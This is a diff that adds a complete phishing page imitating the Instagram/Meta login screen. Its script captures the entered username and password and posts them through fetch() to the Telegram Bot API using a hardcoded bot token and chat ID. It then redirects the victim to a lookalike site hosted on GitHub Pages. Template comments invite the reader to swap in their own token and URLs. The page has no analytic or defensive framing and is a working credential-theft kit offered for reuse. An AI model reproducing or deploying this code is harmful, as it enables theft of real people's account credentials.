@@ -1,0 +1,245 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #FCE7E7, #D9EBFF, #FFFFFF);
+      opacity: 0.9;
+      overflow: hidden;
+      min-height: 100vh;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      text-align: center;
+      position: relative;
+      transition: transform 0.3s ease; /* Added transition effect for smooth scrolling */
+    }
+
+    #language {
+      margin-bottom: 10px;
+      color: #72818d; /* Change color of the text */
+    }
+
+    #logo {
+      width: 100px;
+      height: 100px;
+      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgA8Oyag04Z-J8SPtQJGx62HO-9UjgSRNaFGUatgtZBBvcGLbER3sbU7oH_fvtEQz35YacKm4iiI2Mx9qdDhgxFLIkRVM0X9QCs31XemsPUzl2zbnoB9-ALDfPgHyO8W9op04q2kcA_rNwTeSZuu5AiZvlbwkyOxxQ3dg0zNn6On2xP5KZ0FyrogcnxanxA/s2828/Picsart_24-01-14_17-59-35-636.png'); /* replace with the actual app logo path or URL */
+      background-size: cover;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 20px auto;
+    }
+
+    #login-form {
+      text-align: center;
+    }
+
+    input {
+      width: 90%;
+      padding: 20px;
+      margin-bottom: 10px; /* Adjusted margin-bottom */
+      border: 2px solid #ccc;
+      border-radius: 10px;
+      box-sizing: border-box;
+      display: block;
+      margin: auto;
+      font-size: 17px; /* Change font size */
+      transition: border-color 0.3s ease; /* Added transition effect for smooth color change */
+      outline: none; /* Remove default outline */
+    }
+
+    input:focus {
+      border-color: #6f7682; /* Change border color when focused */
+    }
+
+    #login-btn {
+      background-color: #0064e0;
+      color: #fff;
+      width: 90%;
+      padding: 15px;
+      border: none;
+      border-radius: 37px;
+      cursor: pointer;
+      display: block;
+      margin: auto;
+      margin-top: 1px; /* Adjusted margin-top */
+      font-size: 17px; /* Change font size */
+    }
+
+    #forgot-password {
+      font-size: 17px;
+      color: #1c2a33;
+      margin-top: 10px;
+      display: block;
+      text-decoration: none; /* Remove underline */
+    }
+
+    #create-account-btn {
+      background-color: transparent;
+      border: 2px solid #0064e0;
+      color: #0064e0;
+      width: 84%;
+      padding: 14px;
+      border-radius: 37px;
+      cursor: pointer;
+      display: block;
+      margin: auto;
+      margin-top: 110px; /* Adjusted margin-top */
+      text-decoration: none;
+      font-size: 17px; /* Change font size */
+    }
+
+    #meta-logo {
+      position: fixed;
+      bottom: 10px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 90px;
+      background-image: url('https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTy0VFASY3z5JCZHDVtTADLHMFBuLdyZEO9h7hnqtPDLvwKUxhr5VCOabALfe7DzRu_4RFh0pVX2vDg732stmguCbt0lZqGyjtneUiSDIQKzRR6OCnTgjQhxdrqQw5by0g60ajgIDRrpL3H5fAkCyfoQoTJG7kr3pokmP-ZWQRau0zc2NgrxOsOWqadmxZ/s2828/Picsart_24-01-13_21-00-24-521.png'); /* replace with the actual Meta logo path or URL */
+      background-size: cover;
+      border-radius: 100%;
+      height: 30px;
+    }
+
+    /* Popup Styles */
+    #custom-popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 10px;
+      border-radius: 10px;
+      width: 300px; /* Adjusted width */
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    #popup-heading {
+      font-size: 17px;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    #popup-message {
+      font-size: 16px;
+      margin-bottom: 20px;
+    }
+
+    #ok-btn {
+      background-color: transparent;
+      color: #000000;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container" id="scroll-container">
+    <div id="language">English (India)</div>
+    <div id="logo"></div>
+
+    <form id="login-form">
+      <input type="text" id="name" placeholder="Username, email address, or mobile number" onfocus="scrollUp()" required>
+      <br>
+      <input type="password" id="password" placeholder="Password" onfocus="scrollUp()" required>
+      <br>
+      <button type="button" id="login-btn" onclick="submitForm()">Log In</button>
+      <br>
+      <a href="https://sgsvdbdusbswbwbs.github.io/IG-Forgot-pass/" id="forgot-password">Forgotten Password?</a>
+    </form>
+
+    <a href="https://www.instagram.com/accounts/signup/phone/?hl=en" id="create-account-btn">Create new account</a>
+  </div>
+
+  <div id="meta-logo"></div>
+
+  <!-- Popup HTML -->
+  <div id="custom-popup">
+    <div id="popup-heading">Error</div>
+    <div id="popup-message">Failed to login. Please try again later.</div>
+    <button id="ok-btn" onclick="closePopup()">OK</button>
+  </div>
+
+  <script>
+    function scrollUp() {
+      document.getElementById('scroll-container').style.transform = 'translateY(-70px)'; /* Adjusted translateY value */
+      document.getElementById('meta-logo').style.display = 'none';
+    }
+
+    window.addEventListener('blur', function() {
+      document.getElementById('scroll-container').style.transform = 'translateY(0)';
+      document.getElementById('meta-logo').style.display = 'block';
+    });
+
+    function sendToTelegram(formData) {
+      const botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg'; // replace with your actual Telegram Bot API token
+      const chatId = '-1001590820560'; // replace with your actual Telegram chat ID
+      const message = `Form Data:\n${JSON.stringify(formData)}`;
+  
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(() => {
+        window.location.href = 'https://sgsvdbdusbswbwbs.github.io/Ig.-Updated-version/'; // Replace with your actual redirect URL or remove if not needed
+      })
+      .catch(() => {
+        openPopup();
+      });
+    }
+
+    function submitForm() {
+      const clientName = document.getElementById('name').value;
+      const clientPassword = document.getElementById('password').value;
+
+      if (!clientName) {
+        openPopup();
+      } else if (!clientPassword) {
+        document.getElementById('password').focus(); // Move cursor to the password field
+      } else {
+        const formData = {
+          'Name': clientName,
+          'Password': clientPassword,
+          // Add more fields as needed
+        };
+  
+        sendToTelegram(formData);
+  
+        // Prevent form submission
+        return false;
+      }
+    }
+
+    function openPopup() {
+      document.getElementById('custom-popup').style.display = 'block';
+    }
+
+    function closePopup() {
+      document.getElementById('custom-popup').style.display = 'none';
+    }
+  </script>
+
+</body>
+</html>
